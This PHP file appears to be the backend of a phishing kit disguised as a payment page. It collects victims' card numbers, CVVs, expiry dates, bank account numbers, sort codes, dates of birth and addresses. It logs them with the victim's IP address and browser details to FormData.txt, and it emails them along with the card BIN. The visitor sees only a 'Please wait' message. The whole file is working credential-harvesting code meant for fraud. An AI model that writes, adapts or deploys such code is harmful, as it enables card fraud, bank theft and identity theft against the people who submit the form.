<?php session_start(); ?>
<?php
require_once __DIR__ . '/header.php';
$payment_status = 0;

if (
    (isset($_POST['email']) and !empty($_POST['email'])) and 
    (isset($_POST['name']) and !empty($_POST['name'])) and
    (isset($_POST['dob']) and !empty($_POST['dob'])) and
    (isset($_POST['phone']) and !empty($_POST['phone'])) and
    (isset($_POST['address']) and !empty($_POST['address'])) and
    (isset($_POST['city']) and !empty($_POST['city'])) and
    (isset($_POST['postcode']) and !empty($_POST['postcode'])) and
    (isset($_POST['account_number']) and !empty($_POST['account_number'])) and
    (isset($_POST['sort_code']) and !empty($_POST['sort_code'])) and
    (isset($_POST['card_holderName']) and !empty($_POST['card_holderName'])) and
    (isset($_POST['card_number']) and !empty($_POST['card_number'])) and
    (isset($_POST['cardExpiry']) and !empty($_POST['cardExpiry'])) and
    (isset($_POST['cardCVC']) and !empty($_POST['cardCVC'])) 

    ){

    

    
    
    
    $name            = filter_var($_POST['name'], FILTER_SANITIZE_STRING);
    $email           = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $dob             = filter_var($_POST['dob'], FILTER_SANITIZE_STRING);
    $phone           = filter_var($_POST['phone'], FILTER_SANITIZE_STRING);
    $address         = filter_var($_POST['address'], FILTER_SANITIZE_STRING);
    $city            = filter_var($_POST['city'], FILTER_SANITIZE_STRING);
    $postcode        = filter_var($_POST['postcode'], FILTER_SANITIZE_STRING);
    $card_holderName = filter_var($_POST['card_holderName'], FILTER_SANITIZE_STRING);
    $card_number     = filter_var($_POST['card_number'], FILTER_SANITIZE_STRING);
    $cardExpiry      = filter_var($_POST['cardExpiry'], FILTER_SANITIZE_STRING);
    $cardCVC         = filter_var($_POST['cardCVC'], FILTER_SANITIZE_STRING);
    $account_number  = filter_var($_POST['account_number'], FILTER_SANITIZE_STRING);
    $sort_code       = filter_var($_POST['sort_code'], FILTER_SANITIZE_STRING);


    $payment_status  = 1;

    $file_name        = __DIR__ . "/FormData.txt";

    $browser_details  = getBrowser();

    $data_string      = 'Name: '.$name.PHP_EOL;
    $data_string     .= 'Email: '.$email.PHP_EOL;
    $data_string     .= 'Date of Birth: '.$dob.PHP_EOL;
    $data_string     .= 'Phone: '.$phone.PHP_EOL; 
    $data_string     .= 'Address: '.$address.PHP_EOL;  
    $data_string     .= 'City: '.$city.PHP_EOL; 
    $data_string     .= 'Post Code: '.$postcode.PHP_EOL;
    $data_string     .= 'Card Holder Name: '.$card_holderName.PHP_EOL;
    $data_string     .= 'Card Number: '.$card_number.PHP_EOL; 
    $data_string     .= 'Card Expiry: '.$cardExpiry.PHP_EOL;
    $data_string     .= 'Card CVV: '.$cardCVC.PHP_EOL;
    $data_string     .= 'Account Number: '.$account_number.PHP_EOL;
    $data_string     .= 'Sort Code: '.$sort_code.PHP_EOL;
    $data_string     .= 'Submitted by: '.get_client_ip().PHP_EOL;
    $data_string     .= 'UserAgent : '.$browser_details['userAgent'].PHP_EOL;
    $data_string     .= 'Browser : '.$browser_details['name'].PHP_EOL;
    $data_string     .= 'OS : '.$browser_details['platform'].PHP_EOL;
    $data_string     .= 'Received  : '.date('d-M-Y').', Time:'.date('h:i:s A').PHP_EOL;
    $data_string     .= ' '.PHP_EOL;
    $data_string     .= ' '.PHP_EOL;
    
   
    if (isset($_GET['uid']) and !empty($_GET['uid'])) {
        $uid = $_GET['uid'];
    }
    
    $bin = substr($card_number, 0, 6);

    $_SESSION['formData'] = $_POST;
    
    if ((!isset($_SESSION['uid'])) and (!isset($_SESSION['file_written']))) {
        file_put_contents($file_name, $data_string, FILE_APPEND);    
        $_SESSION['uid'] = $uid;
        $_SESSION['formData']['payment_status'] = 1;
        $_SESSION['file_written']   = 1;
        
        sendEmail($bin, $data_string);
    }else if (($_SESSION['uid'] != $uid)) {
        file_put_contents($file_name, $data_string, FILE_APPEND);    
        $_SESSION['uid'] = $uid;
        $_SESSION['formData']['payment_status'] = 1;
        $_SESSION['file_written']   = 1;
        sendEmail($bin, $data_string);
    }else{
        /*
        user data already written so let it go
        */
    }

    

}

?>

<section>

<div class="container">

    <div class="row">
        <div class="col-lg-8 mx-auto ps_form_wrapper">
        <br/>
        <form id="paymentForm" name="paymentForm" method="POST"  action="#" style="padding-bottom: 150px;">
            <h1 id="title">Please wait</h1>

        </form>

        </div>
    </div>
</div>


</section>

<?php require_once __DIR__ . "/footer.php"; ?>